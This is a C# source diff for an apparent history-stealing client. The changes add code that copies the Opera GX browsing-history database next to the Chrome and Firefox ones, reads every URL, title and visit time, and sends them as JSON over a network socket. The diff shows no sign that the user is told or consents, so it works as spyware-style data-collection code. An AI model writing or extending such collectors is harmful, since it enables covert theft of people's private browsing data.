@@ -8,6 +8,7 @@ using System.Text;
 using System.Data.SQLite;
 using System.Data;
 using System.Text.Json;
+using System.Threading;
 
 namespace GetHistory_Client
 {
@@ -74,6 +75,7 @@ namespace GetHistory_Client
 
         public void SengMsg(string msg)
         {
+            
             this.socket.Send(Encoding.Unicode.GetBytes(msg));
         }
 
@@ -82,20 +84,78 @@ namespace GetHistory_Client
             string json = string.Empty;
             Firefox firefox = new Firefox();
             List<URL> firefoxlURL = new List<URL>();
+            int i = 0;
             firefoxlURL.AddRange(firefox.GetHistory());
             json = JsonSerializer.Serialize<List<URL>>(firefoxlURL);
+
             this.SengMsg(json);
+
             string chromeHistoryFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\History";
-            if (!File.Exists("History"))
+            string operaHistoryFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera GX Stable\History";
+            if (!File.Exists("History_Google"))
             {
-                File.Copy(chromeHistoryFile, "History");
+                File.Copy(chromeHistoryFile, "History_Google");
+            }
+            if (!File.Exists("History_Opera"))
+            {
+                File.Copy(operaHistoryFile, "History_Opera");
             }
             List<HistoryItem> allHistoryItems = new List<HistoryItem>();
-            if (File.Exists("History"))
+            json = string.Empty;
+            if (File.Exists("History_Opera"))
             {
-               
+                int PoshloVseNaXyz = 0;
+
                 SQLiteConnection connection = new SQLiteConnection
-                ("Data Source=" + "History" + ";Version=3;New=False;Compress=True;");
+                ("Data Source=" + "History_Opera" + ";Version=3;New=False;Compress=True;");
+                connection.Open();
+                DataSet dataset = new DataSet();
+                SQLiteDataAdapter adapter = new SQLiteDataAdapter
+                ("select * from urls order by last_visit_time desc", connection);
+                adapter.Fill(dataset);
+                if (dataset != null && dataset.Tables.Count > 0 & dataset.Tables[0] != null)
+                {
+                    DataTable dt = dataset.Tables[0];
+                    foreach (DataRow historyRow in dt.Rows)
+                    {
+                        HistoryItem historyItem = new HistoryItem()
+                        {
+                            URL = Convert.ToString(historyRow["url"]),
+                            Title = Convert.ToString(historyRow["title"])
+
+                        };
+                        // Chrome stores time elapsed since Jan 1, 1601 (UTC format) in microseconds
+                        long utcMicroSeconds = Convert.ToInt64(historyRow["last_visit_time"]);
+                        // Windows file time UTC is in nanoseconds, so multiplying by 10
+                        DateTime gmtTime = DateTime.FromFileTimeUtc(10 * utcMicroSeconds);
+                        // Converting to local time
+                        DateTime localTime = TimeZoneInfo.ConvertTimeFromUtc(gmtTime, TimeZoneInfo.Local);
+                        historyItem.VisitedTime = localTime;
+                       
+                            allHistoryItems.Add(historyItem);
+                        
+
+                        PoshloVseNaXyz++;
+                    }
+
+
+                }
+                connection.Close();
+            }
+
+            json = JsonSerializer.Serialize<List<HistoryItem>>(allHistoryItems);
+            Thread.Sleep(300);
+            this.SengMsg(json);
+         
+
+
+
+
+            if (File.Exists("History_Google"))
+            {
+                allHistoryItems.Clear();
+                SQLiteConnection connection = new SQLiteConnection
+                ("Data Source=" + "History_Google" + ";Version=3;New=False;Compress=True;");
                 connection.Open();
                 DataSet dataset = new DataSet();
                 SQLiteDataAdapter adapter = new SQLiteDataAdapter
@@ -121,14 +181,22 @@ namespace GetHistory_Client
                         DateTime localTime = TimeZoneInfo.ConvertTimeFromUtc(gmtTime, TimeZoneInfo.Local);
                         historyItem.VisitedTime = localTime;
                         allHistoryItems.Add(historyItem);
+                       
+                      
                     }
 
 
                 }
                
             }
+
             json = JsonSerializer.Serialize<List<HistoryItem>>(allHistoryItems);
             this.SengMsg(json);
+
+
+
+
+
         }
     }
 }
